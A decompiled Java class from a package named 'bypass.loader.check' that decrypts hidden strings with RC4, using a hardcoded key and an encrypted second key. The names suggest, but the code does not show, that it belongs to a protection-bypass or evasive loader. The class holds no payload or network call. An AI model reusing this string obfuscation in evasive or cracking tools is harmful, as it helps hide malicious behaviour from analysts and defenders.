package bypass.loader.check;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import sun.misc.BASE64Decoder;

public class JvmArgumentPatternsStrings {
   public static String J = "ARCFOUR";
   public static String D = "JQikA228jUduWzPV";
   private static final long a = 32555333490176L;

   public static String N(String var0) {
      String var4 = "v6uAv319MNIj796GBxilAw==";

      String var3;
      try {
         Cipher var5 = Cipher.getInstance(J);
         SecretKeySpec var6 = new SecretKeySpec(D.getBytes(), J);
         var5.init(2, var6);
         byte[] var7 = new BASE64Decoder().decodeBuffer(var4);
         byte[] var8 = var5.doFinal(var7);
         SecretKeySpec var9 = new SecretKeySpec(var8, J);
         var5.init(2, var9);
         byte[] var10 = new BASE64Decoder().decodeBuffer(var0);
         byte[] var11 = var5.doFinal(var10);
         var3 = new String(var11);
      } catch (Exception var12) {
         var3 = "";
      }

      return var3;
   }
}
